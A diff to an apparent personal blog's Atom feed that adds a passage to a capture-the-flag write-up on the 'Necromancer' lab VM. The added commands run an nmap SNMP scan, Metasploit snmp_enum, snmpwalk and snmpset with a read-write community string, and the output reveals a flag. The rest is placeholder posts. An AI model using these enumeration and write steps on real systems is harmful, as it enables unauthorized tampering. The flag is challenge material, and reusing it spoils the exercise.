@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><?xml-stylesheet type="text/xml" href="/feed.xslt.xml"?><feed xmlns="http://www.w3.org/2005/Atom"><generator uri="http://jekyllrb.com" version="3.3.1">Jekyll</generator><link href="http://www.massini.xyz/feed.xml" rel="self" type="application/atom+xml" /><link href="http://www.massini.xyz/" rel="alternate" type="text/html" /><updated>2017-10-31T20:37:20+01:00</updated><id>http://www.massini.xyz/</id><title>0Skill Blog</title><subtitle>Awesome description.
+<?xml version="1.0" encoding="utf-8"?><?xml-stylesheet type="text/xml" href="/feed.xslt.xml"?><feed xmlns="http://www.w3.org/2005/Atom"><generator uri="http://jekyllrb.com" version="3.3.1">Jekyll</generator><link href="http://www.massini.xyz/feed.xml" rel="self" type="application/atom+xml" /><link href="http://www.massini.xyz/" rel="alternate" type="text/html" /><updated>2017-10-31T20:54:36+01:00</updated><id>http://www.massini.xyz/</id><title>0Skill Blog</title><subtitle>Awesome description.
 </subtitle><author><name>Peter Massini</name><email>peter@massini.xyz</email></author><entry><title>Necromancer</title><link href="http://www.massini.xyz/2017/10/29/Necromancer/" rel="alternate" type="text/html" title="Necromancer" /><published>2017-10-29T12:17:23+01:00</published><updated>2017-10-29T12:17:23+01:00</updated><id>http://www.massini.xyz/2017/10/29/Necromancer</id><content type="html" xml:base="http://www.massini.xyz/2017/10/29/Necromancer/">&lt;p&gt;&lt;img src=&quot;images/necromancer/necro.png&quot; class=&quot;fit image&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;A game between colleagues&lt;/p&gt;
@@ -807,7 +807,111 @@ Nmap done: 1 IP address (1 host up) scanned in 1.77 seconds
   &lt;/code&gt;
 &lt;/pre&gt;
 
-&lt;p&gt;o_O ok….&lt;/p&gt;</content><author><name>Peter Massini</name><email>peter@massini.xyz</email></author><summary></summary></entry><entry><title>First</title><link href="http://www.massini.xyz/2017/10/29/first/" rel="alternate" type="text/html" title="First" /><published>2017-10-29T10:42:13+01:00</published><updated>2017-10-29T10:42:13+01:00</updated><id>http://www.massini.xyz/2017/10/29/first</id><content type="html" xml:base="http://www.massini.xyz/2017/10/29/first/">&lt;p&gt;New layout new try…&lt;/p&gt;</content><author><name>Peter Massini</name><email>peter@massini.xyz</email></author><summary>New layout new try…</summary></entry><entry><title>Curabitur</title><link href="http://www.massini.xyz/2015/02/17/curabitur/" rel="alternate" type="text/html" title="Curabitur" /><published>2015-02-17T00:00:00+01:00</published><updated>2015-02-17T00:00:00+01:00</updated><id>http://www.massini.xyz/2015/02/17/curabitur</id><content type="html" xml:base="http://www.massini.xyz/2015/02/17/curabitur/">&lt;p&gt;&lt;img src=&quot;/images/fulls/03.jpg&quot; class=&quot;fit image&quot; /&gt; Curabitur orci turpis, egestas placerat velit eget, dictum pellentesque ipsum. Suspendisse potenti. Suspendisse ac maximus arcu. Sed ut mattis ex. Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Vestibulum eleifend odio vitae varius aliquam. Quisque ac pretium nisi. Curabitur tempus urna ac ultrices commodo.&lt;/p&gt;
+&lt;p&gt;o_O ok….&lt;/p&gt;
+&lt;pre&gt;
+  &lt;code class=&quot;bash&quot;&gt;
+  nmap -sS 192.168.99.100 -p 161
+
+  Starting Nmap 7.60 ( https://nmap.org ) at 2017-10-31 20:39 CET
+  Nmap scan report for 192.168.99.100
+  Host is up (0.00029s latency).
+
+  PORT    STATE    SERVICE
+  161/tcp filtered snmp
+  MAC Address: 08:00:27:DE:4E:19 (Oracle VirtualBox virtual NIC)
+
+  Nmap done: 1 IP address (1 host up) scanned in 0.32 seconds
+
+  &lt;/code&gt;
+&lt;/pre&gt;
+
+&lt;p&gt;OK, it is open. It’s msf time.&lt;/p&gt;
+
+&lt;pre&gt;
+  &lt;code class=&quot;bash&quot;&gt;
+  msfconsole
+
+
+                        .....
+                   .d$$$$*$$$$$$bc
+                .d$P&quot;    d$$    &quot;*$$.
+               d$&quot;      4$&quot;$$      &quot;$$.
+             4$P        $F ^$F       &quot;$c
+            z$%        d$   3$        ^$L
+           4$$$$$$$$$$$$$$$$$$$$$$$$$$$$$F
+           $$$F&quot;&quot;&quot;&quot;&quot;&quot;&quot;$F&quot;&quot;&quot;&quot;&quot;&quot;$F&quot;&quot;&quot;&quot;&quot;C$$*$
+          .$%&quot;$$e    d$       3$   z$$&quot;  $F
+          4$    *$$.4$&quot;        $$d$P&quot;    $$
+          4$      ^*$$.       .d$F       $$
+          4$       d$&quot;$$c   z$$&quot;3$       $F
+           $L     4$&quot;  ^*$$$P&quot;   $$     4$&quot;
+           3$     $F   .d$P$$e   ^$F    $P
+            $$   d$  .$$&quot;    &quot;$$c 3$   d$
+             *$.4$&quot;z$$&quot;        ^*$$$$ $$
+              &quot;$$$$P&quot;             &quot;$$$P
+                *$b.             .d$P&quot;
+                  &quot;$$$ec.....ze$$$&quot;
+                      &quot;**$$$**&quot;&quot;
+
+
+
+       =[ metasploit v4.16.13-dev                         ]
++ -- --=[ 1697 exploits - 969 auxiliary - 299 post        ]
++ -- --=[ 500 payloads - 40 encoders - 10 nops            ]
++ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
+
+msf &amp;gt; use auxiliary/scanner/snmp/snmp_enum
+msf auxiliary(snmp_enum) &amp;gt; set RHOSTS 192.168.99.100
+RHOST =&amp;gt; 192.168.99.100
+msf auxiliary(snmp_enum) &amp;gt; set COMMUNITY death2all
+COMMUNITY =&amp;gt; death2all
+msf auxiliary(snmp_enum) &amp;gt; run
+
+[+] 192.168.99.100, Connected.
+
+[*] System information:
+
+Host IP                       : 192.168.99.100
+Hostname                      : Fear the Necromancer!
+Description                   : You stand in front of a door.
+Contact                       : The door is Locked. If you choose to defeat me, the door must be Unlocked.
+Location                      : Locked - death2allrw!
+Uptime snmp                   : -
+Uptime system                 : -
+System date                   : -
+
+
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+
+  &lt;/code&gt;
+&lt;/pre&gt;
+
+&lt;pre&gt;
+  &lt;code class=&quot;bash&quot;&gt;
+  snmpwalk -c &quot;death2allrw&quot; -v 1 192.168.99.100 | grep Locked
+Created directory: /var/lib/snmp/mib_indexes
+iso.3.6.1.2.1.1.4.0 = STRING: &quot;The door is Locked. If you choose to defeat me, the door must be Unlocked.&quot;
+iso.3.6.1.2.1.1.6.0 = STRING: &quot;Locked - death2allrw!&quot;
+
+
+  &lt;/code&gt;
+&lt;/pre&gt;
+
+&lt;p&gt;Let’s unlock the door.&lt;/p&gt;
+
+&lt;pre&gt;
+  &lt;code class=&quot;bash&quot;&gt;
+  snmpset -c &quot;death2allrw&quot; -v 1 192.168.99.100 iso.3.6.1.2.1.1.6.0 s  &quot;Unlocked&quot;
+iso.3.6.1.2.1.1.6.0 = STRING: &quot;Unlocked&quot;
+  snmpwalk -c &quot;death2allrw&quot; -v 1 192.168.99.100 | grep flag
+iso.3.6.1.2.1.1.6.0 = STRING: &quot;flag7{9e5494108d10bbd5f9e7ae52239546c4} - t22&quot;
+
+  &lt;/code&gt;
+&lt;/pre&gt;
+
+&lt;p&gt;Flag 7, Yeah…&lt;/p&gt;</content><author><name>Peter Massini</name><email>peter@massini.xyz</email></author><summary></summary></entry><entry><title>First</title><link href="http://www.massini.xyz/2017/10/29/first/" rel="alternate" type="text/html" title="First" /><published>2017-10-29T10:42:13+01:00</published><updated>2017-10-29T10:42:13+01:00</updated><id>http://www.massini.xyz/2017/10/29/first</id><content type="html" xml:base="http://www.massini.xyz/2017/10/29/first/">&lt;p&gt;New layout new try…&lt;/p&gt;</content><author><name>Peter Massini</name><email>peter@massini.xyz</email></author><summary>New layout new try…</summary></entry><entry><title>Curabitur</title><link href="http://www.massini.xyz/2015/02/17/curabitur/" rel="alternate" type="text/html" title="Curabitur" /><published>2015-02-17T00:00:00+01:00</published><updated>2015-02-17T00:00:00+01:00</updated><id>http://www.massini.xyz/2015/02/17/curabitur</id><content type="html" xml:base="http://www.massini.xyz/2015/02/17/curabitur/">&lt;p&gt;&lt;img src=&quot;/images/fulls/03.jpg&quot; class=&quot;fit image&quot; /&gt; Curabitur orci turpis, egestas placerat velit eget, dictum pellentesque ipsum. Suspendisse potenti. Suspendisse ac maximus arcu. Sed ut mattis ex. Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Vestibulum eleifend odio vitae varius aliquam. Quisque ac pretium nisi. Curabitur tempus urna ac ultrices commodo.&lt;/p&gt;
 
 &lt;p&gt;Curabitur iaculis est at mattis mattis. Aliquam erat volutpat. Etiam vitae cursus quam. Nunc ultricies nunc non lorem fringilla cursus. Etiam dapibus libero ac turpis accumsan pulvinar. Sed auctor velit eget mi consequat bibendum. Aliquam interdum purus eget metus pretium ullamcorper.&lt;/p&gt;
 
